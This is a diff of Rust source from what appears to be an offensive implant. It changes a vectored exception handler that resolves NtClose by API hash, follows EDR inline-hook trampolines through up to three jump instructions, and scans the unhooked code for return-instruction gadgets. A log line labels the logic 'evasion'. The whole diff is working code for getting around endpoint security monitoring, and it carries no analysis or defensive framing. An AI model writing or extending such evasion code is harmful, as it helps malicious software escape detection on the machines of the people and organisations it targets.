@@ -45,28 +45,58 @@ unsafe extern "system" fn veh_handler(
                     pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTCLOSE)
                         .unwrap_or(0) as _;
                 if !nt_close.is_null() {
-                    let p = nt_close as *const u8;
-                    // 0xE9 = near relative jmp (5 bytes): typical inline hook.
-                    // 0xFF 0x25 = indirect jmp via RIP-relative pointer (6 bytes):
-                    // common in 64-bit EDR hooks that redirect via a trampoline table.
-                    if *p == 0xFF && *p.add(1) == 0x25 {
-                        // Read the 4-byte signed RIP-relative displacement.
-                        let disp = std::ptr::read_unaligned(p.add(2) as *const i32);
-                        // Slot address = end of instruction (p+6) + disp.
-                        let slot = (p as usize).wrapping_add(6).wrapping_add(disp as isize as usize);
-                        // Dereference the slot to get the real target address.
-                        let target = std::ptr::read_unaligned(slot as *const usize);
-                        if target != 0 {
-                            ptr = target as *const u8;
+                    let mut p = nt_close as *const u8;
+                    // Follow inline hook trampolines up to a bounded depth.
+                    // Only recognized jmp patterns are followed:
+                    // - 0xFF 0x25: jmp qword ptr [rip+disp32]
+                    // - 0xE9:      jmp rel32
+                    const MAX_HOOK_CHAIN_DEPTH: usize = 3;
+                    let mut depth = 0usize;
+                    loop {
+                        if depth >= MAX_HOOK_CHAIN_DEPTH {
+                            log::trace!(
+                                "evasion: VEH ret-gadget hook chain limit hit (max_depth={}); continuing search path",
+                                MAX_HOOK_CHAIN_DEPTH
+                            );
+                            return winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH;
                         }
-                    } else if *p != 0xE9 {
-                        // Not a near-jmp hook: safe to use as ret-gadget source.
-                        ptr = p;
+
+                        if *p == 0xFF && *p.add(1) == 0x25 {
+                            // RIP-relative indirect jmp: target slot = p+6+disp32.
+                            let disp = std::ptr::read_unaligned(p.add(2) as *const i32);
+                            let slot =
+                                (p as usize).wrapping_add(6).wrapping_add(disp as isize as usize);
+                            let target = std::ptr::read_unaligned(slot as *const usize);
+                            if target == 0 {
+                                break;
+                            }
+                            p = target as *const u8;
+                            depth += 1;
+                            continue;
+                        }
+
+                        if *p == 0xE9 {
+                            // Relative near jmp: target = p+5+disp32.
+                            let disp = std::ptr::read_unaligned(p.add(1) as *const i32);
+                            let target =
+                                (p as usize).wrapping_add(5).wrapping_add(disp as isize as usize);
+                            if target == 0 {
+                                break;
+                            }
+                            p = target as *const u8;
+                            depth += 1;
+                            continue;
+                        }
+
+                        // Not a recognized hook jump at this level; use this address
+                        // as the ret-gadget scan source.
+                        break;
                     }
+                    ptr = p;
                 }
             }
 
-            for _ in 0..32 {
+            for _ in 0..64 {
                 if *ptr == 0xC3 || *ptr == 0xC2 {
                     break;
                 }
